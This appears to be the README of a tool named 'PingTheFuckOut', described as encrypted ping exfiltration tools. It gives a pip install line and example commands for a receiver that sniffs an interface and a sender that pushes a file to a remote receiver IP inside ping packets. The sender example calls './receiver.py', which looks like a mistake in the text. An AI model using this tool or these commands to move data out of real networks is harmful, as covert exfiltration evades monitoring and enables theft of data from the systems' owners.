# PingTheFuckOut
Encrypted ping exfiltration tools

## Install
As usual:
`python3 -m pip install -r requirements.txt`

## Example
On the receiver:
`./receiver.py -p my_password -s 64 -o data_out.txt -i eth0`

On the sender:
`./receiver.py -p my_password -s 64 -i data.txt [receiver_ip]`

## Notes
Please note that this shouldn't be tested on localhost only, as sniffing on a loopback interface might get packets twice.